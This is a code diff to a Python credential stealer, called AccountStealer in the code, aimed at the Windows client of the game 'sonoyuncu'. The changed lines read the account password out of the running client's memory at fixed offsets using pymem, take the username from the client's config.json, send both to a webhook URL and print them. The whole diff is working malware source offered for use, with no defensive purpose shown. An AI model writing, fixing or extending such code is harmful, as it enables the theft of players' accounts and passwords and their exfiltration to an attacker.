@@ -1,3 +1,5 @@
+import json
+
 import requests, ctypes, psutil, pymem, time, re, os
 from ctypes import wintypes
 
@@ -8,6 +10,7 @@ from ctypes import wintypes
 """
 
 APPLICATION_PATH = os.path.expandvars('%APPDATA%') + '/.sonoyuncu/sonoyuncuclient.exe'
+CONFIG_PATH = os.path.expandvars('%APPDATA%') + '/.sonoyuncu/config.json'
 WEBHOOK_URL = 'UR_WEBHOOK_URL'
 
 class AccountStealer:
@@ -94,10 +97,9 @@ class AccountStealer:
                 process_memory = pymem.Pymem(process_id)
                 base_address = pymem.process.module_from_name(process_memory.process_handle, "sonoyuncuclient.exe").lpBaseOfDll
 
-                username = re.search(r'[A-Za-z0-9._-]{3,16}', process_memory.read_bytes(base_address + 0x1C78E5, 50).decode('utf-8', errors='ignore')).group(0)
                 password = re.search(r'[A-Za-z0-9._\-@+#$%^&*=!?~\'\",\\|/:<>[\]{}()]{1,128}', process_memory.read_bytes(base_address + 0x1C6900, 100).decode('utf-8', errors='ignore')).group(0)
 
-                return username, password
+                return json.load(open(CONFIG_PATH))["userName"], password
             except:
                 time.sleep(0.1)
                 continue
@@ -145,4 +147,4 @@ if __name__ == "__main__":
     if os.path.exists(APPLICATION_PATH):
         account = AccountStealer()
         if send_webhook(account.extract_credentials()):
-            print('succesfully')
+            print('succesfully ~> {}:{}'.format(*account.extract_credentials()))
